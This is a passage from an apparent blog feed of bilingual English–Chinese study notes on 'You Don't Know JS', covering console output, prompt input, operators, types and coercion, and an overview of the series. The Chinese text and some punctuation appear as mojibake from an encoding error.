çš„æµè§ˆå™¨ä¸Šæ‰“å¼€ä¸€ä¸ªæ–°çš„æ ‡ç­¾ï¼Œæˆ‘æ›´å–œæ¬¢åœ¨åœ°å€æ è¾“å…¥<code>about:blank</code>ï¼Œç„¶åï¼Œç¡®ä¿ä½ çš„å¼€å‘è€…æ§åˆ¶å°æ˜¯æ‰“å¼€çš„ï¼Œå°±åƒæˆ‘ä»¬åˆšæ‰æåŠçš„é‚£æ ·ã€‚</p><p>Now, type this code and see how it runs:</p><p>ç°åœ¨ï¼Œè¾“å…¥è¿™æ®µä»£ç ç„¶åçœ‹å®ƒæ‰§è¡Œ:</p><p>a = 21;</p><p>b = a * 2;</p><p>console.log( b );<br>Typing the preceding code into the console in Chrome should produce something like the following:</p><p>è¾“å…¥è¿‡ç¨‹ä¹‹å‰çš„ä»£ç åˆ°è°·æ­Œæ§åˆ¶å°åº”è¯¥äº§ç”Ÿä¸€äº›å‘ä¸‹é¢çš„äº‹æƒ…:</p><p>Go on, try it. The best way to learn programming is to start coding!</p><p>ç»§ç»­ï¼Œè¯•è¯•çœ‹ã€‚å­¦ä¹ ç¨‹åºæœ€å¥½çš„æ–¹æ³•æ˜¯å¼€å§‹ç¼–ç ã€‚</p><h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>In the previous code snippet, we used console.log(..). Briefly, letâ€™s look at what that line of code is all about.</p><p>åœ¨å…ˆå‰çš„ä»£ç ç‰‡æ®µï¼Œæˆ‘ä»¬ä½¿ç”¨äº†console.log(..).çŸ­æš‚çš„ï¼Œè®©æˆ‘ä»¬å¯»æ‰¾ä¸€ä¸‹è¿™ä¸€è¡Œä»£ç æ˜¯å…³äºä»€ä¹ˆçš„ã€‚</p><p>You may have guessed, but thatâ€™s exactly how we print text (aka output to the user) in the developer console. There are two characteristics of that statement that we should explain.</p><p>ä½ å¯èƒ½å·²ç»çŒœåˆ°äº†ï¼Œä½†æ˜¯é‚£æ­£æ˜¯æˆ‘ä»¬å¦‚ä½•åœ¨å¼€å‘è€…æ§åˆ¶å°ä¸­æ‰“å°æ–‡æœ¬(è¾“å…¥ç”¨æˆ·å)ï¼Œæˆ‘ä»¬åº”è¯¥è§£é‡Šè¿™ä¸ªè¯­å¥ä¸­çš„é‚£ä¸¤ä¸ªå­—ç¬¦ã€‚</p><p>First, the log( b ) part is referred to as a function call (see â€œFunctionsâ€). Whatâ€™s happening is weâ€™re handing the b variable to that function, which asks it to take the value of b and print it to the console.</p><p>é¦–å…ˆï¼Œè¿™ä¸ªlog(b)éƒ¨åˆ†è¢«ç§°ä¸ºå‡½æ•°(çœ‹ â€œå‡½æ•°â€)ã€‚æˆ‘ä»¬å°†å˜é‡bäº¤ç»™è¿™ä¸ªå‡½æ•°å‘ç”Ÿäº†ä»€ä¹ˆï¼Œè¿™ä¸ªå‡½æ•°è¦æ±‚å®ƒå–bçš„å€¼å¹¶ä¸”æ‰“å°åœ¨æ§åˆ¶å°ä¸Šã€‚</p><p>Second, the console. part is an object reference where the log(..) function is located. We cover objects and their properties in more detail in Chapter 2.</p><p>ç¬¬äºŒï¼Œ<code>console.</code>éƒ¨åˆ†æ˜¯ä½äº<code>log(..)</code>å‡½æ•°éƒ¨åˆ†å¯¹è±¡çš„å¼•ç”¨ï¼Œæˆ‘ä»¬åœ¨ç¬¬äºŒç« ä»‹ç»äº†å¯¹è±¡å’Œä»–ä»¬å±æ€§æ›´å¤šçš„ç»†èŠ‚ã€‚</p><p>Another way of creating output that you can see is to run an alert(..) statement. For example:</p><p>ä½ èƒ½çœ‹åˆ°å…¶ä»–æ–¹å¼åˆ›å»ºè¾“å‡ºè¯­å¥æ˜¯ä½¿ç”¨<code>alert()</code>è¯­å¥ã€‚ä¾‹å¦‚:</p><p>alert( b );<br>If you run that, youâ€™ll notice that instead of printing the output to the console, it shows a popup â€œOKâ€ box with the contents of the b variable. However, using console.log(..) is generally going to make learning about coding and running your programs in the console easier than using alert(..), because you can output many values at once without interrupting the browser interface.</p><p>å¦‚æœä½ è¿è¡Œè¿™æ®µä»£ç ï¼Œä½ å°†ä¼šæ³¨æ„åˆ°å®ƒä»£æ›¿äº†è¾“å‡ºåœ¨æ§åˆ¶å°ä¸Š,å®ƒæ˜¾ç¤ºä¸€ä¸ªå¼¹å‡ºçš„â€œokâ€æ¡†å¸¦æœ‰å˜é‡bçš„å†…å®¹ã€‚ç„¶è€Œï¼Œé€šå¸¸ä½¿ç”¨<code>console.log(..)</code>å­¦ä¹ å…³äºç¼–ç¨‹å’Œè¿è¡Œç¨‹åºæ¯”ä½¿ç”¨<code>alert(..)</code>æ›´å®¹æ˜“ï¼Œå› ä¸ºä½ å¯ä»¥ä¸€æ¬¡æ€§è¾“å‡ºå¾ˆå¤šå€¼å¹¶ä¸”ä¸ä¼šä¸­æ–­é¡µé¢ã€‚</p><p>For this book, weâ€™ll use console.log(..) for output.</p><p>å¯¹äºæœ¬ä¹¦ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>console.log(..)</code>æ¥è¾“å‡º</p><p>##Input</p><p>While weâ€™re discussing output, you may also wonder about input (i.e., receiving information from the user).</p><p>å½“æˆ‘ä»¬åœ¨è®¨è®ºè¾“å‡ºæ—¶ï¼Œä½ å¯èƒ½ä¹Ÿæƒ³è¦çŸ¥é“è¾“å…¥(æ¥æ”¶ç”¨æˆ·çš„ä¿¡æ¯)</p><p>The most common way that happens is for the HTML page to show form elements (like text boxes) to a user that they can type into, and then using JS to read those values into your programâ€™s variables.</p><p>å‘ç”Ÿè¿™ç§æœ€å¸¸è§çš„æ–¹å¼æ˜¯HTMLé¡µé¢å±•ç¤ºè¡¨å•å…ƒç´ (æƒ³æ–‡æœ¬è¾“å…¥æ¡†)ç»™ç”¨æˆ·è¾“å…¥ï¼Œç„¶åä½¿ç”¨JSå»è¯»å–è¿™äº›å˜é‡åˆ°ä½ ç¨‹åºçš„å˜é‡ä¸­ã€‚</p><p>But thereâ€™s an easier way to get input for simple learning and demonstration purposes such as what youâ€™ll be doing throughout this book. Use the prompt(..) function:</p><p>ä½†æ˜¯æœ€ç®€å•æ–¹å¼çš„è·å–ç”¨æˆ·è¾“å…¥å¯¹äºç®€å•çš„å­¦ä¹ å’Œæ¼”ç¤ºç›®çš„ï¼Œæ¯”å¦‚ä½ å°†è¦é€šè¿‡æœ¬ä¹¦æ¥åšçš„ã€‚ä½¿ç”¨<code>prompt(..)</code>å‡½æ•°:</p><p>age = prompt( â€œPlease tell me your age:â€ );</p><p>console.log( age );<br>As you may have guessed, the message you pass to prompt(..) â€“ in this case, â€œPlease tell me your age:â€ â€“ is printed into the popup.</p><p>ä½ å¯èƒ½å·²ç»çŒœåˆ°äº†ï¼Œä½ è¾“å…¥åˆ°<code>prompt(..)</code>çš„ä¿¡æ¯ â€“åœ¨è¿™ä¸ªæ¡ˆä¾‹é‡Œã€‚â€œè¯·å‘Šè¯‰æˆ‘ä½ çš„åå­—:â€ â€“ æ‰“å°åœ¨è¿™ä¸ªå¼¹çª—ä¸Šã€‚</p><p>This should look similar to the following:</p><p>çœ‹èµ·æ¥è·Ÿä¸‹åˆ—çš„å¾ˆç›¸ä¼¼:</p><p>Once you submit the input text by clicking â€œOK,â€ youâ€™ll observe that the value you typed is stored in the age variable, which we then output with console.log(..):</p><p>ä¸€æ—¦ä½ é€šè¿‡ç‚¹å‡»â€œokâ€æ¥æäº¤è¾“å…¥æ–‡æœ¬ï¼Œä½ å°†ä¼šè§‚å¯Ÿåˆ°ä½ è¾“å…¥çš„å°†ä¼šå­˜å‚¨åˆ°ageå˜é‡ä¸­ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡<code>console.log(..)</code>è¾“å‡ºå˜é‡</p><p>To keep things simple while weâ€™re learning basic programming concepts, the examples in this book will not require input. But now that youâ€™ve seen how to use prompt(..), if you want to challenge yourself you can try to use input in your explorations of the examples.</p><p>å½“æˆ‘ä»¬å­¦ä¹ åŸºç¡€ç¨‹åºæ¦‚å¿µæ—¶ä¿æŒç®€å•ï¼Œåœ¨è¿™æœ¬ä¹¦çš„æ¡ˆä¾‹ä¸­å°†ä¸éœ€è¦è¾“å…¥ã€‚ä½†æ˜¯ç°åœ¨ä½ å·²ç»çŸ¥é“å¦‚ä½•ä½¿ç”¨<code>prompt(..)</code>ï¼Œå¦‚æœä½ æƒ³è¦æŒ‘æˆ˜ä½ è‡ªå·±ä½ å¯ä»¥å°è¯•ä½¿ç”¨inputæ¥æ¢ç´¢è¿™ä¸ªæ¡ˆä¾‹ã€‚</p><h2 id="Operators"><a href="#Operators" class="headerlink" title="Operators"></a>Operators</h2><p>Operators are how we perform actions on variables and values. Weâ€™ve already seen two JavaScript operators, the = and the *.</p><p>æ“ä½œç¬¦æ˜¯æˆ‘ä»¬å¦‚ä½•æ“ä½œå˜é‡å’Œå€¼ï¼Œæˆ‘ä»¬å·²ç»çœ‹åˆ°ä¸¤ä¸ªJavaScriptæ“ä½œç¬¦ï¼Œ=å·å’Œ*å·ã€‚</p><p>The * operator performs mathematic multiplication. Simple enough, right?</p><p>*å·æ“ä½œç¬¦æ‰§è¡Œæ•°å­¦ä¹˜æ³•è¿ç®—ï¼Œå¾ˆç®€å•å¯¹å—ï¼Ÿ</p><p>The = equals operator is used for assignment â€“ we first calculate the value on the right-hand side (source value) of the = and then put it into the variable that we specify on the left-hand side (target variable).</p><p>=å·æ“ä½œç¬¦é€šå¸¸ç”¨æ¥å¤åˆ¶â€“ æˆ‘ä»¬é¦–å…ˆè®¡ç®—ç­‰å·å³è¾¹çš„å€¼ç„¶åå°†å€¼=å·å·¦è¾¹çš„å˜é‡ä¸­(ç›®æ ‡å˜é‡).</p><p>Warning: This may seem like a strange reverse order to specify assignment. Instead of a = 42, some might prefer to flip the order so the source value is on the left and the target variable is on the right, like 42 -&gt; a (this is not valid JavaScript!). Unfortunately, the a = 42 ordered form, and similar variations, is quite prevalent in modern programming languages. If it feels unnatural, just spend some time rehearsing that ordering in your mind to get accustomed to it.</p><p>Consider:</p><p>a = 2;<br>b = a + 1;<br>Here, we assign the 2 value to the a variable. Then, we get the value of the a variable (still 2), add 1 to it resulting in the value 3, then store that value in the b variable.</p><p>While not technically an operator, youâ€™ll need the keyword var in every program, as itâ€™s the primary way you declare (aka create) variables (see â€œVariablesâ€).</p><p>You should always declare the variable by name before you use it. But you only need to declare a variable once for each scope (see â€œScopeâ€); it can be used as many times after that as needed. For example:</p><p>var a = 20;</p><p>a = a + 1;<br>a = a * 2;</p><p>console.log( a );    // 42<br>Here are some of the most common operators in JavaScript:</p><p>Assignment: = as in a = 2.</p><p>Math: + (addition), - (subtraction), <em> (multiplication), and / (division), as in a </em> 3.</p><p>Compound Assignment: +=, -=, *=, and /= are compound operators that combine a math operation with assignment, as in a += 2 (same as a = a + 2).</p><p>Increment/Decrement: ++ (increment), â€“ (decrement), as in a++ (similar to a = a + 1).</p><p>Object Property Access: . as in console.log().</p><p>Objects are values that hold other values at specific named locations called properties. obj.a means an object value called obj with a property of the name a. Properties can alternatively be accessed as obj[â€œaâ€]. See Chapter 2.</p><p>Equality: == (loose-equals), === (strict-equals), != (loose not-equals), !== (strict not-equals), as in a == b.</p><p>See â€œValues &amp; Typesâ€ and Chapter 2.</p><p>Comparison: &lt; (less than), &gt; (greater than), &lt;= (less than or loose-equals), &gt;= (greater than or loose-equals), as in a &lt;= b.</p><p>See â€œValues &amp; Typesâ€ and Chapter 2.</p><p>Logical: &amp;&amp; (and), || (or), as in a || b that selects either a or b.</p><p>These operators are used to express compound conditionals (see â€œConditionalsâ€), like if either a or b is true.</p><p>Note: For much more detail, and coverage of operators not mentioned here, see the Mozilla Developer Network (MDN)â€™s â€œExpressions and Operatorsâ€ (<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Expressions_and_Operators)" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Expressions_and_Operators)</a>.</p><p>Values &amp; Types<br>If you ask an employee at a phone store how much a certain phone costs, and they say â€œninety-nine, ninety-nineâ€ (i.e., $99.99), theyâ€™re giving you an actual numeric dollar figure that represents what youâ€™ll need to pay (plus taxes) to buy it. If you want to buy two of those phones, you can easily do the mental math to double that value to get $199.98 for your base cost.</p><p>If that same employee picks up another similar phone but says itâ€™s â€œfreeâ€ (perhaps with air quotes), theyâ€™re not giving you a number, but instead another kind of representation of your expected cost ($0.00) â€“ the word â€œfree.â€</p><p>When you later ask if the phone includes a charger, that answer could only have been either â€œyesâ€ or â€œno.â€</p><p>In very similar ways, when you express values in a program, you choose different representations for those values based on what you plan to do with them.</p><p>These different representations for values are called types in programming terminology. JavaScript has built-in types for each of these so called primitive values:</p><p>When you need to do math, you want a number.<br>When you need to print a value on the screen, you need a string (one or more characters, words, sentences).<br>When you need to make a decision in your program, you need a boolean (true or false).<br>Values that are included directly in the source code are called literals. string literals are surrounded by double quotes â€œâ€¦â€ or single quotes (â€˜â€¦â€™) â€“ the only difference is stylistic preference. number and boolean literals are just presented as is (i.e., 42, true, etc.).</p><p>Consider:</p><p>â€œI am a stringâ€;<br>â€˜I am also a stringâ€™;</p><p>42;</p><p>true;<br>false;<br>Beyond string/number/boolean value types, itâ€™s common for programming languages to provide arrays, objects, functions, and more. Weâ€™ll cover much more about values and types throughout this chapter and the next.</p><p>Converting Between Types<br>If you have a number but need to print it on the screen, you need to convert the value to a string, and in JavaScript this conversion is called â€œcoercion.â€ Similarly, if someone enters a series of numeric characters into a form on an ecommerce page, thatâ€™s a string, but if you need to then use that value to do math operations, you need to coerce it to a number.</p><p>JavaScript provides several different facilities for forcibly coercing between types. For example:</p><p>var a = â€œ42â€;<br>var b = Number( a );</p><p>console.log( a );    // â€œ42â€<br>console.log( b );    // 42<br>Using Number(..) (a built-in function) as shown is an explicit coercion from any other type to the number type. That should be pretty straightforward.</p><p>But a controversial topic is what happens when you try to compare two values that are not already of the same type, which would require implicit coercion.</p><p>When comparing the string â€œ99.99â€ to the number 99.99, most people would agree they are equivalent. But theyâ€™re not exactly the same, are they? Itâ€™s the same value in two different representations, two different types. You could say theyâ€™re â€œloosely equal,â€ couldnâ€™t you?</p><p>To help you out in these common situations, JavaScript will sometimes kick in and implicitly coerce values to the matching types.</p><p>So if you use the == loose equals operator to make the comparison â€œ99.99â€ == 99.99, JavaScript will convert the left-hand side â€œ99.99â€ to its number equivalent 99.99. The comparison then becomes 99.99 == 99.99, which is of course true.</p><p>While designed to help you, implicit coercion can create confusion if you havenâ€™t taken the time to learn the rules that govern its behavior. Most JS developers never have, so the common feeling is that implicit coercion is confusing and harms programs with unexpected bugs, and should thus be avoided. Itâ€™s even sometimes called a flaw in the design of the language.</p><p>However, implicit coercion is a mechanism that can be learned, and moreover should be learned by anyone wishing to take JavaScript programming seriously. Not only is it not confusing once you learn the rules, it can actually make your programs better! The effort is well worth it.</p><p>Note: For more information on coercion, see Chapter 2 of this title and Chapter 4 of the Types &amp; Grammar title of this series.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Chapter-1-Into-Programming&quot;&gt;&lt;a href=&quot;#Chapter-1-Into-Programming&quot; class=&quot;headerlink&quot; title=&quot;Chapter 1: Into Programming&quot;&gt;&lt;/a&gt;Chapter 1: Into Programming&lt;/h2&gt;&lt;p&gt;Welcome to the You Donâ€™t Know JS (YDKJS) series.&lt;/p&gt;
&lt;p&gt;æ¬¢è¿æ¥åˆ°ä½ ä¸æ‡‚jsç³»åˆ—&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="book" scheme="http://zhoushaw.github.io/tags/book/"/>
    
  </entry>
  
  <entry>
    <title>è¯‘æ–‡:you don&#39;t know js ä¹‹ Into YDKJS</title>
    <link href="http://zhoushaw.github.io/2019/02/26/learning/book-notes/you&#39;s%20not%20know%20javascript/Into%20YDKJS/"/>
    <id>http://zhoushaw.github.io/2019/02/26/learning/book-notes/you&#39;s not know javascript/Into YDKJS/</id>
    <published>2019-02-26T02:42:35.000Z</published>
    <updated>2019-04-14T13:54:11.946Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Chapter-3-Into-YDKJS"><a href="#Chapter-3-Into-YDKJS" class="headerlink" title="Chapter 3: Into YDKJS"></a>Chapter 3: Into YDKJS</h2><p>What is this series all about? Put simply, itâ€™s about taking seriously the task of learning all parts of JavaScript, not just some subset of the language that someone called â€œthe good parts,â€ and not just whatever minimal amount you need to get your job done at work.</p><p>è¿™ä¸€ç³»åˆ—ä¹¦ä¸»è¦ç”¨äºè°ˆè®ºä»€ä¹ˆå‘¢ï¼Ÿç®€å•æ¥è¯´ï¼Œè¿™ä¸€ç³»åˆ—ä¹¦ä¸»è¦ç”¨æˆ·è®²è¿°å¦‚ä½•å­¦å¥½javascriptï¼Œè€Œä¸æ˜¯å­¦ä¹ ä¸€äº›äººç§°ä¹‹ä¸ºjavascriptä¸­å¥½çš„éƒ¨åˆ†ï¼Œä¹Ÿä¸ä»…ä»…èƒ½è®©ä½ æå®šå·¥ä½œçš„é‚£ä¸€å°éƒ¨åˆ†å†…å®¹ã€‚</p><div><a id="more"></a></div><p>Serious developers in other languages expect to put in the effort to learn most or all of the language(s) they primarily write in, but JS developers seem to stand out from the crowd in the sense of typically not learning very much of the language. This is not a good thing, and itâ€™s not something we should continue to allow to be the norm.</p><p>åœ¨å…¶ä»–è¯­è¨€ä¸­ï¼Œè®¤çœŸçš„å¼€å‘è€…æ€»æ˜¯å¸Œæœ›åŠªåŠ›å­¦ä¹ ä»–ä»¬ä¸»è¦ä½¿ç”¨è¯­è¨€çš„å¤§éƒ¨åˆ†æˆ–å…¨éƒ¨ã€‚ä½†JSå¼€å‘è€…é€šå¸¸ä¸å¤ªå­¦ä¹ è¿™é—¨è¯­è¨€ï¼Œè€Œæ˜¾å¾—ç‰¹åˆ«çªå‡ºã€‚è¿™ä¸æ˜¯ä¸€ä»¶å¥½äº‹ï¼Œæˆ‘ä»¬ä¹Ÿä¸åº”è¯¥å°†å…¶è§†ä¸ºå¸¸æ€ã€‚</p><p>The You Donâ€™t Know JS (YDKJS) series stands in stark(å®Œå…¨) contrast(å¯¹æ¯”) to the typical approaches to learning JS, and is unlike almost any other JS books you will read. It challenges you to go beyond your comfort zone(èˆ’é€‚åŒº) and to ask the deeper â€œwhyâ€ questions for every single behavior you encounter. Are you up for that challenge?</p><p>ä½ ä¸çŸ¥é“JSç³»åˆ—ä¹¦ç±ä¸ä¼ ç»Ÿçš„å­¦ä¹ JSæ–¹å¼å¤§ä¸ç›¸åŒï¼Œå®ƒä¹Ÿä¸åƒä½ æ‰€é˜…è¯»çš„å…¶ä»–ç³»åˆ—çš„JSä¹¦ç±ã€‚å®ƒä¼šä½¿ä½ é‡åˆ°æŒ‘æˆ˜é€¼è¿«ä½ èµ°å‡ºèˆ’é€‚åŒºï¼Œå¯¹ä½ é‡åˆ°çš„æ¯ä¸€ä¸ªé—®é¢˜æ·±å…¥çš„é—®ä¸ºä»€ä¹ˆã€‚ä½ å‡†å¤‡å¥½è¿æ¥æŒ‘æˆ˜äº†å—ï¼Ÿ</p><p>Iâ€™m going to use this final chapter to briefly(çŸ­æš‚) summarize(æ€»ç»“) what to expect from the rest of the books in the series, and how to most effectively go about building a foundation of JS learning on top of(åœ¨â€¦ä¹‹ä¸Š) YDKJS.</p><p>æˆ‘å°†ä¼šç”¨æœ€åä¸€ç« æ¥åšä¸€ä¸ªç®€çŸ­çš„æ€»ç»“ï¼Œè¿™ä¸€ç³»åˆ—å…¶ä»–ç« èŠ‚çš„å†…å®¹ï¼Œå¦‚ä½•æ›´æœ‰æ•ˆçš„é€šè¿‡YDKJSå»ºç«‹å­¦ä¹ JSçš„åŸºç¡€ã€‚</p><h2 id="ä½œç”¨åŸŸ-amp-é—­åŒ…"><a href="#ä½œç”¨åŸŸ-amp-é—­åŒ…" class="headerlink" title="ä½œç”¨åŸŸ &amp; é—­åŒ…"></a>ä½œç”¨åŸŸ &amp; é—­åŒ…</h2><p>Perhaps one of the most fundamental things youâ€™ll need to quickly come to terms with is how scoping of variables really works in JavaScript. Itâ€™s not enough to have anecdotal fuzzy beliefs about scope.</p><p>å¯èƒ½ä½ æœ€éœ€è¦å°½å¿«æ˜ç™½çš„åŸºæœ¬åŸç†å°±æ˜¯å˜é‡çš„ä½œç”¨åŸŸæ˜¯å¦‚ä½•åœ¨JSä¸­å·¥ä½œçš„ã€‚ä»…ä»…åªçŸ¥é“å…³äºä½œç”¨åŸŸæ¨¡ç³Šçš„æ¦‚å¿µæ˜¯ä¸å¤Ÿçš„ã€‚</p><p>The Scope &amp; Closures title starts by debunking the common misconception that JS is an â€œinterpreted languageâ€ and therefore not compiled. Nope.</p><p>ä½œç”¨åŸŸ &amp; é—­åŒ…è¿™ä¸€ç« èŠ‚ä»æ­ç¤ºæœ€å¸¸è§çš„è¯¯è§£å¼€å§‹ï¼ŒJSæ˜¯ä¸€é—¨è§£é‡Šæ€§è¯­è¨€ï¼Œè€Œä¸æ˜¯è¢«ç¼–è¯‘çš„ã€‚ä¸å¯¹ã€‚</p><p>The JS engine compiles your code right before (and sometimes during!) execution. So we use some deeper understanding of the compilerâ€™s approach to our code to understand how it finds and deals with variable and function declarations. Along the way, we see the typical metaphor for JS variable scope management, â€œHoisting.â€</p><p>JSå¼•æ“ä¼šå¯¹ä½ çš„ä»£ç è¿›è¡Œç¼–è¯‘åœ¨ä½ çš„ä»£ç æ‰§è¡Œä¹‹å‰(æœ‰æ—¶åœ¨æ‰§è¡Œæ—¶)ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ·±å…¥ç†è§£ç¼–è¯‘å™¨å¤„ç†æˆ‘ä»¬ä»£ç çš„æ–¹å¼ï¼Œä»¥ç†è§£ç¼–è¯‘å™¨å¦‚ä½•æ‰¾åˆ°å¹¶å¤„ç†ç”³æ˜çš„å˜é‡å’Œå‡½æ•°ã€‚æ²¿ç€è¿™æ¡è·¯ï¼Œæˆ‘ä»¬å°†è§åˆ°jså˜é‡ä½œç”¨åŸŸç®¡ç†ç‰¹æœ‰çš„éšå¼æå‡ã€‚</p><p>This critical(æ‰¹è¯„çš„ã€å†³å®šæ€§çš„) understanding of â€œlexical(è¯æ±‡) scopeâ€ is what we then base our exploration of closure on for the last chapter of the book. Closure is perhaps the single most important concept in all of JS, but if you havenâ€™t first grasped(æŠ“ä½ã€ç†ä¼š) firmly how scope works, closure will likely remain beyond your grasp.</p><p>ç†è§£ä½œç”¨åŸŸè¿™ä¸€å…³é”®è¯æ˜¯è‡³å…³é‡è¦çš„ï¼Œåœ¨æœ€åä¸€å¼ å®ƒæ˜¯æˆ‘ä»¬ç†è§£å’Œæ¢ç´¢é—­åŒ…çš„åŸºç¡€ã€‚é—­åŒ…å¯èƒ½æ˜¯jsæ‰€æœ‰æ¦‚å¿µä¸­æœ€é‡è¦ä¹‹ä¸€ï¼Œä½†æ˜¯å¦‚æœä½ ç¬¬ä¸€æ¬¡æ²¡æœ‰å®Œå…¨ç†è§£ä½œç”¨åŸŸçš„å·¥ä½œåŸç†ï¼Œé—­åŒ…å°†ä¼šè¶…è¶Šä½ çš„ç†è§£ã€‚</p><p>One important application of closure is the module pattern, as we briefly introduced in this book in Chapter 2. The module pattern is perhaps the most prevalent code organization pattern in all of JavaScript; deep understanding of it should be one of your highest priorities.</p><p>æ¨¡å—æ¨¡å¼æ˜¯é—­åŒ…ä¸­ä¸€ä¸ªé‡è¦çš„åº”ç”¨ï¼Œæˆ‘ä»¬åœ¨æœ¬ä¹¦ç¬¬äºŒç« ä¼šå°†ä¼šä»‹ç»å®ƒçš„åŸºç¡€æ¦‚å¿µã€‚æ¨¡å—æ¨¡å¼å¯èƒ½æ˜¯æ‰€æœ‰jsæµè¡Œä»£ç ç»„ç»‡çš„æ¨¡å¼ã€‚æ·±å…¥ç†è§£å®ƒåº”è¯¥æ˜¯ä½ æœ€ä¼˜å…ˆåšçš„äº‹æƒ…ã€‚</p><h2 id="this-amp-Object-Prototypes"><a href="#this-amp-Object-Prototypes" class="headerlink" title="this &amp; Object Prototypes"></a>this &amp; Object Prototypes</h2><p>Perhaps one of the most widespread and persistent mistruths about JavaScript is that the this keyword refers to the function it appears in. Terribly mistaken.</p><p>å¯èƒ½å…³äºJSæœ€æ™®éæœ€æŒä¹…çš„è°¬è®ºæ˜¯å…³é”®è¯thisæŒ‡ä»£çš„æ˜¯å®ƒçš„æ‰€å‡ºç°çš„å‡½æ•°ã€‚å¯æ€•çš„è°¬è®ºã€‚</p><p>The this keyword is dynamically bound based on how the function in question is executed, and it turns out there are four simple rules to understand and fully determine this binding.</p><p>å…³é”®è¯thisçš„æŒ‡å‘åŠ¨æ€çš„åŸºäºå‡½æ•°æ˜¯å¦‚ä½•æ‰§è¡Œçš„ï¼Œæ˜¯è¿™é‡Œæœ‰å››ä¸ªç®€å•çš„è§„åˆ™å»ç†è§£å’Œé€‰æ‹©thisç»‘å®šã€‚</p><p>Closely related to the this keyword is the object prototype mechanism, which is a look-up chain for properties, similar to how lexical scope variables are found. But wrapped up in the prototypes is the other huge miscue about JS: the idea of emulating (fake) classes and (so-called â€œprototypalâ€) inheritance.</p><p>ä¸thiså…³é”®è¯å¯†å¯†ç›¸å…³çš„æ˜¯objectåŸå‹çš„åŸç†ï¼Œè¿™æ˜¯ä¸€ä¸ªæŸ¥æ‰¾å±æ€§çš„é“¾ã€‚ä¸æŸ¥è¯¢çš„æ–¹å¼ç›¸ä¼¼ã€‚ä½†æ˜¯åŒ…å«åœ¨åŸå‹ä¸­å¦ä¸€ä¸ªJSçš„å·¨å¤§è°¬è®º:æ¨¡æ‹Ÿç±»å’Œç»§æ‰¿çš„æƒ³æ³•</p><p>Unfortunately, the desire to bring class and inheritance design pattern thinking to JavaScript is just about the worst thing you could try to do, because while the syntax may trick you into thinking thereâ€™s something like classes present, in fact the prototype mechanism is fundamentally opposite in its behavior.</p><p>ä¸å¹¸çš„æ˜¯ï¼Œæ¸´æœ›å°†ç±»å’Œç»§æ‰¿è®¾è®¡æ¨¡å¼çš„æƒ³æ³•å¸¦å…¥JSå°†æ˜¯ä½ åšçš„æœ€ç³Ÿç³•çš„äº‹æƒ…ï¼Œå› ä¸ºå°†è¿™ç§è¯­æ³•ä¼šä½¿ä½ è®¤ä¸ºæœ‰ç±»çš„åŠŸèƒ½çš„å­˜åœ¨ï¼Œäº‹å®ä¸ŠåŸå‹åŸæ¥æ˜¯ä¸ç±»çš„æ¦‚å¿µæ˜¯å®Œå…¨ç›¸åçš„ã€‚</p><p>Whatâ€™s at issue is whether itâ€™s better to ignore the mismatch and pretend that what youâ€™re implementing is â€œinheritance,â€ or whether itâ€™s more appropriate to learn and embrace how the object prototype system actually works. The latter is more appropriately named â€œbehavior delegation.â€</p><p>é—®é¢˜æ˜¯å¿½ç•¥å®ƒçš„ä¸åŒ¹é…å¹¶ä¸”å‡è£…æ˜¯åœ¨å®Œæˆç»§æ‰¿æ˜¯å¦æ˜¯ä¸€ä»¶å¥½äº‹ï¼Œæˆ–è€…å­¦ä¹ å¹¶æ‹¥æŠ±å¯¹è±¡å±æ€§ç³»ç»Ÿå·¥ä½œæ–¹å¼æ˜¯å¦åˆé€‚ã€‚åè€…è¢«ç§°ä¸ºè¡Œä¸ºç³»ç»Ÿæ›´åˆé€‚ã€‚</p><p>This is more than syntactic preference. Delegation is an entirely different, and more powerful, design pattern, one that replaces the need to design with classes and inheritance. But these assertions will absolutely fly in the face of nearly every other blog post, book, and conference talk on the subject for the entirety of JavaScriptâ€™s lifetime.</p><p>è¿™ä¸ä»…ä»…æ˜¯è¯­æ³•ä¸Šçš„åå¥½ã€‚å§”æ‰˜æ˜¯ä¸€ç§å®Œå…¨ä¸åŒæ›´å¼ºå¤§çš„è®¾è®¡æ¨¡å¼ï¼Œä¸€ä¸ªå¯ä»¥æ›¿æ¢äº†éœ€è¦ç±»å’Œç»§æ‰¿çš„è®¾è®¡ã€‚ä½†æ˜¯åœ¨javascriptæ•´ä¸ªç”Ÿå‘½å‘¨æœŸä¸­åœ¨å‡ ä¹æ‰€æœ‰åšå®¢çš„æ–‡ç« ã€ä¹¦ç±å’Œä¼šè®®è®¨è®ºå…³äºè¿™ä¸ªä¸»é¢˜éƒ½æ˜¯èƒŒé“è€Œé©°çš„ã€‚</p><p>The claims I make regarding delegation versus inheritance come not from a dislike of the language and its syntax, but from the desire to see the true capability of the language properly leveraged and the endless confusion and frustration wiped away.</p><p>æˆ‘å¯¹å§”æ‰˜å’Œç»§æ‰¿åšå‡ºçš„å®£è¨€ä¸æ˜¯æºäºå¯¹è¯­è¨€å’Œå…¶è¯­æ³•çš„åŒæ¶ï¼Œè€Œæ˜¯æ¥è‡ªäºæ¸´æœ›çœ‹åˆ°è¿™é—¨è¯­è¨€çš„çœŸå®åŠ›é‡è¢«æ­£ç¡®åœ°åˆ©ç”¨ï¼Œæ¸´æœ›çœ‹åˆ°æ— å°½çš„å›°æƒ‘ä¸æ²®ä¸§è¢«ä¸€æ‰«è€Œå…‰ã€‚</p><p>But the case I make regarding prototypes and delegation is a much more involved one than what I will indulge here. If youâ€™re ready to reconsider everything you think you know about JavaScript â€œclassesâ€ and â€œinheritance,â€ I offer you the chance to â€œtake the red pillâ€ (Matrix 1999) and check out Chapters 4-6 of the this &amp; Object Prototypes title of this series.</p><p>ä½†æ˜¯æˆ‘è®²çš„å…³äºåŸå‹å’Œå§”æ‰˜ä¾‹å­æ¯”æˆ‘åœ¨è¿™é‡Œè®²çš„æ¶‰åŠçš„è¿˜è¦å¤šã€‚å¦‚æœä½ å‡†å¤‡å¥½é‡æ–°æ€è€ƒä½ 